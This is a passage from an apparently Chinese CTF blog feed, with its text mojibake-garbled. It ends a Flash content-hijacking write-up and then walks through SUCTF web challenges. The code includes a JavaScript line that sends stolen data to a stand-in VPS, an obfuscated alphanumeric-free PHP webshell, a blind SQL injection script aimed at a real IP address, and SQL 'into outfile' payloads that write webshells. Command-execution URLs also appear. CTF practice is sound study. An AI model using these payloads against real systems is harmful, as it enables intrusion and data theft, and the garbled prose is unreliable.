¼å¼çš„æ—¶å€™ä¼šè§£ææˆapplication/x-shockwave-flash;ä½†æ˜¯è§£æzwsçš„æ—¶å€™ä¼šå˜æˆapplication/octet-streamä»è€Œç»•è¿‡MIMEé™åˆ¶ã€‚ æ‰«ç›®å½•å‘ç°adminç›®å½•,éœ€è¦ç®¡ç†å‘˜æ‰èƒ½çœ‹flag.é‚£ä¹ˆæ€è·¯å°±æ˜ç¡®äº†,æˆ‘ä»¬å¯ä»¥å…ˆä¼ ä¸€ä¸ªflashæ–‡ä»¶ä¸Šå»,ç„¶åè‡ªå·±åœ¨vpsä¸Šæ„é€ ä¸€ä¸ªæ”»å‡»é¡µé¢æ¥åŠ è½½æœåŠ¡å™¨ä¸Šçš„flash,ç„¶åå¡«åˆ°åšå®¢æ è®©botå»è®¿é—®,botè®¿é—®ä¹‹åè§¦å‘flashæ–‡ä»¶ä»è€Œæ‰“åˆ°adminä¸‹çš„flagç„¶åè¿”å›åˆ°æˆ‘ä»¬çš„æœåŠ¡å™¨. <strong>å…·ä½“æ“ä½œ</strong> å…‹éš†ä¸€ä¸‹å‰é¢æåˆ°çš„githubçš„é‚£ä¸ªé¡¹ç›®,ç„¶åæ‰¾åˆ°ContentHijacking.swf,å°†æ–‡ä»¶å¤´æ”¹æˆZWS <img src="/images/2018/07/hijacking.jpg" alt="blacsheep" /> ç„¶åä¼ åˆ°æœåŠ¡å™¨,è®°å½•ä¼ çš„è·¯å¾„,ç„¶åContentHijackingLoader.htmlé‡Œé¢125è¡Œå·¦å³åŠ ä¸Šä¸€æ®µä»£ç new Imageçš„ä»£ç </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">new Image().src=&#x27;http://your_vps/xxx.php&#x27;+encodeURIComponent(strData)</span><br></pre></td></tr></table></figure><p><img src="/images/2018/07/hijacking-2.jpg" alt="blacsheep" /> ç„¶åvpsä¸Šé¢æ‰“å¼€ContentHijackingLoader.html,å¡«å†™ä¸€ä¸‹flashçš„åœ°å€å’Œæ”»å‡»åœ°å€,ç„¶åç”Ÿæˆpayload <img src="/images/2018/07/hijacking-3.png" alt="blacsheep" /> ç”Ÿæˆä¹‹åæäº¤ä¸Šå»å°±å¯ä»¥åœ¨vpsæ”¶åˆ°flagäº† è¿™ä¸ªéƒ½æ˜¯åˆ«äººå†™çš„,ç¯å¢ƒå·²ç»å…³äº†,ç®€å•è®°å½•ä¸‹ å‚è€ƒé“¾æ¥: <a href="https://liuxianglai.github.io/2018/06/26/%E5%AE%89%E6%81%92%E6%9D%AF%E6%9C%88%E8%B5%9BWrite-up/" title="https://liuxianglai.github.io/2018/06/26/%E5%AE%89%E6%81%92%E6%9D%AF%E6%9C%88%E8%B5%9BWrite-up/">https://liuxianglai.github.io/2018/06/26/%E5%AE%89%E6%81%92%E6%9D%AF%E6%9C%88%E8%B5%9BWrite-up/</a> <a href="http://www.freebuf.com/articles/web/35353.html" title="http://www.freebuf.com/articles/web/35353.html">http://www.freebuf.com/articles/web/35353.html</a></p>]]></content>
      
      
      <categories>
          
          <category> webç¯‡ </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>suctfè¡¥é¢˜</title>
      <link href="/2018/07/28/suctf%E8%A1%A5%E9%A2%98/"/>
      <url>/2018/07/28/suctf%E8%A1%A5%E9%A2%98/</url>
      
        <content type="html"><![CDATA[<p>å¾ˆä¹…ä»¥å‰çš„æ¯”èµ›äº†,å·¥ä½œå®¤åŒå­¦è¯´æœ‰docker,å°±ç”¨ä»–çš„dockerå¤ç°ä¸€ä¸‹å§</p><h2 id="anonymous">Anonymous</h2><p><strong>æè¿°:PHPæ˜¯æœ€å¥½çš„è¯­è¨€ï¼Œä¸æ˜¯å—?</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$MY</span> = <span class="title function_ invoke__">create_function</span>(<span class="string">&quot;&quot;</span>,<span class="string">&quot;die(`cat flag.php`);&quot;</span>);</span><br><span class="line"><span class="variable">$hash</span> = <span class="title function_ invoke__">bin2hex</span>(<span class="title function_ invoke__">openssl_random_pseudo_bytes</span>(<span class="number">32</span>));</span><br><span class="line"><span class="keyword">eval</span>(<span class="string">&quot;function SUCTF_<span class="subst">$hash</span>()&#123;&quot;</span></span><br><span class="line">    .<span class="string">&quot;global \$MY;&quot;</span></span><br><span class="line">    .<span class="string">&quot;\$MY();&quot;</span></span><br><span class="line">    .<span class="string">&quot;&#125;&quot;</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;func_name&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$_GET</span>[<span class="string">&quot;func_name&quot;</span>]();</span><br><span class="line">    <span class="keyword">die</span>();</span><br><span class="line">&#125;</span><br><span class="line"><span class="title function_ invoke__">show_source</span>(<span class="keyword">__FILE__</span>);</span><br></pre></td></tr></table></figure><p>hitcon2017çš„baby^masteré‚£é“é¢˜çš„ç¬¬äºŒä¸ªç‚¹,åŒ¿åå‡½æ•°åé€šè¿‡å¤šçº¿ç¨‹é¢„æµ‹</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">GET</span> <span class="string">/?func_name=%00lambda_1</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>118.24.125.87:84</span><br><span class="line"><span class="attribute">Cache-Control</span><span class="punctuation">: </span>max-age=0</span><br><span class="line"><span class="attribute">Upgrade-Insecure-Requests</span><span class="punctuation">: </span>1</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/Â§5Â§.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.106 Safari/537.36</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8</span><br><span class="line"><span class="attribute">Accept-Encoding</span><span class="punctuation">: </span>gzip, deflate</span><br><span class="line"><span class="attribute">Accept-Language</span><span class="punctuation">: </span>zh-CN,zh;q=0.9,en;q=0.8</span><br><span class="line"><span class="attribute">Cookie</span><span class="punctuation">: </span>PHPSESSID=rkb49l8crfqltdncen0brqotc5</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>close</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="/images/2018/08/su-1.jpg" alt="blacsheep" /> æ‹¿åˆ°flag</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SUCTF&#123;fake_flag_web_a&#125;</span><br></pre></td></tr></table></figure><h2 id="getshell">getshell</h2><p>æ–‡ä»¶ä¸Šä¼ é¢˜ ç»™äº†éƒ¨åˆ†æºç </p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="variable">$contents</span>=<span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;tmp_name&quot;</span>]))&#123;</span><br><span class="line">    <span class="variable">$data</span>=<span class="title function_ invoke__">substr</span>(<span class="variable">$contents</span>,<span class="number">5</span>);</span><br><span class="line">    <span class="keyword">foreach</span> (<span class="variable">$black_char</span> <span class="keyword">as</span> <span class="variable">$b</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_ invoke__">stripos</span>(<span class="variable">$data</span>, <span class="variable">$b</span>) !== <span class="literal">false</span>)&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;illegal char&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;     </span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure><p>burpå•å­—ç¬¦è·‘é»‘åå• <img src="/images/2018/08/su-2.jpg" alt="blacsheep" /> å‘ç°èƒ½ç”¨çš„å­—ç¬¦å¾ˆå°‘,æ‰€æœ‰çš„å­—æ¯æ•°å­—éƒ½è¢«banäº†,æƒ³åˆ°på¸ˆå‚…åšå®¢é‡Œçš„ç»•è¿‡æ•°å­—å­—æ¯çš„webshell <a href="https://www.leavesongs.com/PENETRATION/webshell-without-alphanum.html" title="https://www.leavesongs.com/PENETRATION/webshell-without-alphanum.html">https://www.leavesongs.com/PENETRATION/webshell-without-alphanum.html</a> çœ‹åˆ°ç¬¬ä¸€ä¸ªç‰ˆæœ¬</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$__</span>=(<span class="string">&#x27;&gt;&#x27;</span>&gt;<span class="string">&#x27;&lt;&#x27;</span>)+(<span class="string">&#x27;&gt;&#x27;</span>&gt;<span class="string">&#x27;&lt;&#x27;</span>);</span><br><span class="line"><span class="variable">$_</span>=<span class="variable">$__</span>/<span class="variable">$__</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$____</span>=<span class="string">&#x27;&#x27;</span>;</span><br><span class="line"><span class="variable">$___</span>=<span class="string">&quot;ç°&quot;</span>;<span class="variable">$____</span>.=~(<span class="variable">$___</span>&#123;<span class="variable">$_</span>&#125;);<span class="variable">$___</span>=<span class="string">&quot;å’Œ&quot;</span>;<span class="variable">$____</span>.=~(<span class="variable">$___</span>&#123;<span class="variable">$__</span>&#125;);<span class="variable">$___</span>=<span class="string">&quot;å’Œ&quot;</span>;<span class="variable">$____</span>.=~(<span class="variable">$___</span>&#123;<span class="variable">$__</span>&#125;);<span class="variable">$___</span>=<span class="string">&quot;çš„&quot;</span>;<span class="variable">$____</span>.=~(<span class="variable">$___</span>&#123;<span class="variable">$_</span>&#125;);<span class="variable">$___</span>=<span class="string">&quot;åŠ&quot;</span>;<span class="variable">$____</span>.=~(<span class="variable">$___</span>&#123;<span class="variable">$_</span>&#125;);<span class="variable">$___</span>=<span class="string">&quot;å§‹&quot;</span>;<span class="variable">$____</span>.=~(<span class="variable">$___</span>&#123;<span class="variable">$__</span>&#125;);</span><br><span class="line"></span><br><span class="line"><span class="variable">$_____</span>=<span class="string">&#x27;_&#x27;</span>;<span class="variable">$___</span>=<span class="string">&quot;ä¿¯&quot;</span>;<span class="variable">$_____</span>.=~(<span class="variable">$___</span>&#123;<span class="variable">$__</span>&#125;);<span class="variable">$___</span>=<span class="string">&quot;ç°&quot;</span>;<span class="variable">$_____</span>.=~(<span class="variable">$___</span>&#123;<span class="variable">$__</span>&#125;);<span class="variable">$___</span>=<span class="string">&quot;æ¬¡&quot;</span>;<span class="variable">$_____</span>.=~(<span class="variable">$___</span>&#123;<span class="variable">$_</span>&#125;);<span class="variable">$___</span>=<span class="string">&quot;ç«™&quot;</span>;<span class="variable">$_____</span>.=~(<span class="variable">$___</span>&#123;<span class="variable">$_</span>&#125;);</span><br><span class="line"></span><br><span class="line"><span class="variable">$_</span>=<span class="variable">$$_____</span>;</span><br><span class="line"><span class="variable">$____</span>(<span class="variable">$_</span>[<span class="variable">$__</span>]);</span><br></pre></td></tr></table></figure><p>ä½†æ˜¯è¿™é‡Œä¸èƒ½æœ‰<code>&gt;,&lt;,/</code> æ‰€ä»¥æ›¿æ¢ä¸€ä¸‹</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$_</span>=([]==[]);</span><br><span class="line"><span class="variable">$__</span>=<span class="variable">$_</span>;</span><br><span class="line"><span class="variable">$___</span>=ç°;<span class="variable">$____</span>=~(<span class="variable">$___</span>[<span class="variable">$_</span>]);<span class="variable">$___</span>=æ¬¡;<span class="variable">$____</span>.=~(<span class="variable">$___</span>[<span class="variable">$_</span>]);<span class="variable">$___</span>=æ¬¡;<span class="variable">$____</span>.=~(<span class="variable">$___</span>[<span class="variable">$_</span>]);<span class="variable">$___</span>=çš„;<span class="variable">$____</span>.=~(<span class="variable">$___</span>[<span class="variable">$_</span>]);<span class="variable">$___</span>=åŠ;<span class="variable">$____</span>.=~(<span class="variable">$___</span>[<span class="variable">$_</span>]);<span class="variable">$___</span>=ç«™;<span class="variable">$____</span>.=~(<span class="variable">$___</span>[<span class="variable">$_</span>]);</span><br><span class="line"><span class="variable">$_____</span>=_;<span class="variable">$___</span>=æ¯;<span class="variable">$_____</span>.=~(<span class="variable">$___</span>[<span class="variable">$_</span>]);<span class="variable">$___</span>=å°‘;<span class="variable">$_____</span>.=~(<span class="variable">$___</span>[<span class="variable">$_</span>]);<span class="variable">$___</span>=æ¬¡;<span class="variable">$_____</span>.=~(<span class="variable">$___</span>[<span class="variable">$_</span>]);<span class="variable">$___</span>=ç«™;<span class="variable">$_____</span>.=~(<span class="variable">$___</span>[<span class="variable">$_</span>]);</span><br><span class="line"><span class="variable">$_</span>=<span class="variable">$$_____</span>;</span><br><span class="line"><span class="variable">$____</span>(<span class="variable">$_</span>[<span class="variable">$__</span>]);</span><br></pre></td></tr></table></figure><p>shellçš„å¯†ç æ˜¯1 <img src="/images/2018/08/su-3.jpg" alt="blacsheep" /></p><h2 id="multisql">MultiSql</h2><p><strong>æè¿°:åˆšå…¥å‘çš„å°æ–¹å†™äº†ä¸ªæ¼æ´ä¿¡æ¯å¹³å°ï¼Œå¬è¯´è¿™ä¸ªå¹³å°å­˜åœ¨æ¼æ´ï¼Œä½ èƒ½åˆ©ç”¨å—ï¼Ÿ</strong> ç®€å•æµ‹è¯•,å‘ç°idå­˜åœ¨æ³¨å…¥</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://118.24.125.87:82/user/user.php?id=1</span><br></pre></td></tr></table></figure><p>æ•´å½¢æ³¨å…¥,è¿‡æ»¤äº†ä¸€äº›ä¸œè¥¿,ä¸è¿‡æ— æ‰€è°“è¿˜æ˜¯å¯ä»¥æ³¨. è¿›ä¸€æ­¥æµ‹è¯•,å‘ç°å¯ä»¥è¯»å–æ–‡ä»¶ å†™ä¸ªè„šæœ¬</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line">u=requests.session()</span><br><span class="line">u.post(<span class="string">&#x27;http://118.24.125.87:82/user/logCheck.php&#x27;</span>,\</span><br><span class="line">       data=&#123;<span class="string">&#x27;user&#x27;</span>: <span class="string">&#x27;username&#x27;</span>,<span class="string">&#x27;pass&#x27;</span>: <span class="string">&#x27;username&#x27;</span>,<span class="string">&#x27;submit&#x27;</span>: <span class="string">&#x27;submit&#x27;</span>&#125;)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> num <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">500</span>):</span><br><span class="line">    <span class="keyword">for</span> each <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">33</span>,<span class="number">128</span>):</span><br><span class="line">        ok=<span class="number">0</span></span><br><span class="line">        url=<span class="string">&#x27;http://118.24.125.87:82/user/user.php?id=1^\</span></span><br><span class="line"><span class="string">(if(ascii(mid(load_file(\</span></span><br><span class="line"><span class="string">0x2f7661722f7777772f68746d6c2f66617669636f6e2f7368656c6c2e706870\</span></span><br><span class="line"><span class="string">),&#123;place&#125;,1))%3D&#123;asc&#125;,0,1))&#x27;</span>.<span class="built_in">format</span>(place=num,asc=each)                       </span><br><span class="line">        r=u.get(url)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&#x27;admin&#x27;</span> <span class="keyword">in</span> r.text:</span><br><span class="line">            <span class="built_in">print</span>(<span class="built_in">chr</span>(each),end=<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">if</span> each==<span class="string">&#x27;Z&#x27;</span>:</span><br><span class="line">            ok=<span class="number">1</span></span><br><span class="line">    <span class="keyword">if</span> ok==<span class="number">1</span>:</span><br><span class="line">        <span class="keyword">break</span></span><br></pre></td></tr></table></figure><h3 id="ç”¨æ­¢ç—’åŒå­¦çš„shell">ç”¨æ­¢ç—’åŒå­¦çš„shell</h3><p>ç†è®ºæ¥è¯´æ˜¯å¯ä»¥è¯»å®Œæ–‡ä»¶çš„,ä¸è¿‡è¿™é‡Œæˆ‘å°±å·æ‡’äº† é¦–å…ˆç®€å•çœ‹ä¸€ä¸‹id,å‘ç°å‰é¢æœ‰äººå†™</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php `$_GET[x]`;?&gt;&#x27;into outfile&#x27;/var/www/html/favicon/4.php</span><br></pre></td></tr></table></figure><p>å°è¯•è®¿é—®4.php å‘ç°å¯ä»¥è®¿é—®,é‚£ä¹ˆç›´æ¥å»è¯»4.phpçš„ä»£ç ,å‘ç°æ˜¯ä¸ªå‘½ä»¤æ‰§è¡Œçš„æ–‡ä»¶ é‚£ä¹ˆç›´æ¥å†™ä¸€ä¸ªshell ç„¶åçœ‹åˆ°</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://118.24.125.87:82/favicon/shell.php?cmd=var_dump(`cat%20/var/www/html/index.php`);</span><br></pre></td></tr></table></figure><p>å¯ä»¥å¼€å§‹è¯»æ–‡ä»¶äº†,æ‰¾flag <img src="/images/2018/08/su-4.jpg" alt="blacsheep" /></p><h3 id="é¢„æœŸè§£">é¢„æœŸè§£</h3><p>è¯»æ–‡ä»¶,è¯»åˆ°user/user.php,å‘ç°<code>mysqli_multi_query()</code> é‚£ä¹ˆå¯ä»¥ç”¨åˆ†å·éš”å¼€æ‰§è¡Œå…¶ä»–å‘½ä»¤ ä¸ºäº†ç»•è¿‡å¼•å·çš„é™åˆ¶,ä½¿ç”¨é¢„ç¼–è¯‘è¯­å¥</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">set @s=concat(CHAR(115),CHAR(101),CHAR(108),CHAR(101),CHAR(99),CHAR(116),CHAR(32),CHAR(39),CHAR(60),CHAR(63),CHAR(112),CHAR(104),CHAR(112),CHAR(32),CHAR(112),CHAR(104),CHAR(112),CHAR(105),CHAR(110),CHAR(102),CHAR(111),CHAR(40),CHAR(41),CHAR(59),CHAR(63),CHAR(62),CHAR(39),CHAR(32),CHAR(105),CHAR(110),CHAR(116),CHAR(111),CHAR(32),CHAR(111),CHAR(117),CHAR(116),CHAR(102),CHAR(105),CHAR(108),CHAR(101),CHAR(32),CHAR(39),CHAR(47),CHAR(118),CHAR(97),CHAR(114),CHAR(47),CHAR(119),CHAR(119),CHAR(119),CHAR(47),CHAR(104),CHAR(116),CHAR(109),CHAR(108),CHAR(47),CHAR(102),CHAR(97),CHAR(118),CHAR(105),CHAR(99),CHAR(111),CHAR(110),CHAR(47),CHAR(49),CHAR(46),CHAR(112),CHAR(104),CHAR(112),CHAR(39),CHAR(59));</span><br><span class="line">PREPARE s2 FROM @s;</span><br><span class="line">EXECUTE s2;</span><br></pre></td></tr></table></figure><p>ç¼–ç éƒ¨åˆ†å³</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select <span class="string">&#x27;&lt;?php phpinfo();?&gt;&#x27;</span> into outfile <span class="string">&#x27;/var/www/html/favicon/1.php&#x27;</span>;</span><br></pre></td></tr></table></figure><p>ç„¶å<img src="/images/2018/08/su-5.jpg" alt="blacsheep" /></p><h3 id="éé¢„æœŸè§£">éé¢„æœŸè§£</h3><p>äºŒæ¬¡æ³¨å…¥ æ³¨å†Œçš„æ—¶å€™å‡è®¾æˆ‘ä»¬æ³¨å†Œ<code>123'</code></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$clean_name</span> = <span class="title function_ invoke__">waf</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;username&#x27;</span>]);</span><br><span class="line"><span class="variable">$clean_pass</span> = <span class="title function_ invoke__">waf</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;New_pass&#x27;</span>]);  </span><br><span class="line">    ...</span><br><span class="line">    ...</span><br><span class="line"><span class="variable">$sql2</span> = <span class="string">&quot;INSERT INTO dwvs_user_message(DWVS_user_name,DWVS_user_passwd,DWVS_user_enr_time) VALUES (&#x27;<span class="subst">$clean_name</span>&#x27;,&#x27;<span class="subst">$password</span>&#x27;,&#x27;<span class="subst">$time</span>&#x27;)&quot;</span>;</span><br><span class="line"><span class="title function_ invoke__">mysqli_query</span>(<span class="variable">$connect</span>,<span class="variable">$sql2</span>) <span class="keyword">or</span> <span class="keyword">die</span>(<span class="string">&quot;Error!!&quot;</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>è¿™é‡Œå­˜è¿›æ•°æ®åº“çš„usernameå°±æ˜¯<code>123'</code> ç„¶åé€€å‡ºç™»å½•,å†ç™»å½•è¿›å»,ç™»å½•éƒ¨åˆ†ä»£ç </p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include_once</span>(<span class="string">&#x27;../bwvs_config/sys_config.php&#x27;</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;submit&#x27;</span>]))&#123;</span><br><span class="line">     <span class="keyword">if</span>(!<span class="keyword">empty</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;user&#x27;</span>]) &amp;&amp; !<span class="keyword">empty</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;pass&#x27;</span>]))&#123;</span><br><span class="line">        <span class="variable">$clean_name</span> = <span class="title function_ invoke__">waf</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;user&#x27;</span>]);</span><br><span class="line"></span><br><span class="line">        <span class="variable">$clean_pass</span> = <span class="title function_ invoke__">waf</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;pass&#x27;</span>]);</span><br><span class="line"></span><br><span class="line">        <span class="variable">$sql</span> = <span class="string">&quot;SELECT * FROM dwvs_user_message WHERE DWVS_user_name =&quot;</span>.<span class="string">&quot;&#x27;&quot;</span>.<span class="string">&quot;<span class="subst">$clean_name</span>&quot;</span>.<span class="string">&quot;&#x27;&quot;</span>.<span class="string">&quot; AND DWVS_user_passwd=&quot;</span>.<span class="string">&quot;&#x27;&quot;</span>.<span class="title function_ invoke__">md5</span>(<span class="string">&quot;<span class="subst">$clean_pass</span>&quot;</span>).<span class="string">&quot;&#x27;&quot;</span>;</span><br><span class="line"></span><br><span class="line">        <span class="variable">$data</span> = <span class="title function_ invoke__">mysqli_query</span>(<span class="variable">$connect</span>, <span class="variable">$sql</span>) <span class="keyword">or</span> <span class="keyword">die</span>(<span class="string">&#x27;Mysql Error!!&#x27;</span>);</span><br><span class="line">        <span class="title function_ invoke__">mysqli_close</span>(<span class="variable">$connect</span>);</span><br><span class="line">            <span class="keyword">if</span>(<span class="title function_ invoke__">mysqli_num_rows</span>(<span class="variable">$data</span>) == <span class="number">1</span>) </span><br><span class="line">            &#123;</span><br><span class="line">                 <span class="variable">$row</span> = <span class="title function_ invoke__">mysqli_fetch_array</span>(<span class="variable">$data</span>);</span><br><span class="line">                  <span class="variable">$_SESSION</span>[<span class="string">&#x27;user_id&#x27;</span>] = <span class="variable">$row</span>[<span class="string">&#x27;DWVS_user_id&#x27;</span>];</span><br><span class="line">                  <span class="variable">$_SESSION</span>[<span class="string">&#x27;user_name&#x27;</span>] = <span class="variable">$row</span>[<span class="string">&#x27;DWVS_user_name&#x27;</span>];</span><br><span class="line">                  <span class="keyword">if</span>(!<span class="keyword">empty</span>(<span class="variable">$row</span>[<span class="string">&#x27;DWVS_user_favicon&#x27;</span>]))</span><br><span class="line">                  &#123;</span><br><span class="line">                    <span class="variable">$_SESSION</span>[<span class="string">&#x27;user_favicon&#x27;</span>] = <span class="variable">$row</span>[<span class="string">&#x27;DWVS_user_favicon&#x27;</span>];</span><br><span class="line">                  &#125;<span class="keyword">else</span></span><br><span class="line">                  &#123;</span><br><span class="line">                    <span class="variable">$rand_num</span> = <span class="title function_ invoke__">rand</span>(<span class="number">1</span>,<span class="number">4</span>);</span><br><span class="line">                    <span class="variable">$user_favicon</span> = <span class="string">&quot;../favicon/&quot;</span>.<span class="string">&quot;<span class="subst">$rand_num</span>&quot;</span>.<span class="string">&quot;.jpg&quot;</span>;</span><br><span class="line">                    <span class="variable">$_SESSION</span>[<span class="string">&#x27;user_favicon&#x27;</span>] = <span class="variable">$user_favicon</span>;</span><br><span class="line">                  &#125;</span><br><span class="line">                    <span class="title function_ invoke__">header</span>(<span class="string">&#x27;Location: user.php&#x27;</span>);   </span><br><span class="line">            &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                <span class="variable">$_SESSION</span>[<span class="string">&#x27;login_error&#x27;</span>] = <span class="string">&#x27;Error&#x27;</span>;</span><br><span class="line">                <span class="title function_ invoke__">header</span>(<span class="string">&#x27;Location: login.php&#x27;</span>);          </span><br><span class="line">                &#125;   </span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                <span class="variable">$_SESSION</span>[<span class="string">&#x27;login_error&#x27;</span>] = <span class="string">&#x27;Error&#x27;</span>;</span><br><span class="line">                <span class="title function_ invoke__">header</span>(<span class="string">&#x27;Location: login.php&#x27;</span>);          </span><br><span class="line">                &#125;   </span><br><span class="line"></span><br><span class="line">&#125;<span class="keyword">else</span>  </span><br><span class="line">&#123;</span><br><span class="line">    <span class="title function_ invoke__">not_find</span>(<span class="variable">$_SERVER</span>[<span class="string">&#x27;PHP_SELF&#x27;</span>]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>é‡ç‚¹å…³æ³¨è¿™é‡Œ</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$_SESSION</span>[<span class="string">&#x27;user_name&#x27;</span>] = <span class="variable">$row</span>[<span class="string">&#x27;DWVS_user_name&#x27;</span>];</span><br></pre></td></tr></table></figure><p>è¿™é‡Œç™»å½•ä¹‹å,sessionçš„å€¼æ˜¯ä»æ•°æ®åº“å–å‡ºçš„å€¼,è¿™é‡Œçš„å¼•å·å¹¶æ²¡æœ‰é—­åˆ,ç„¶åuser.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span 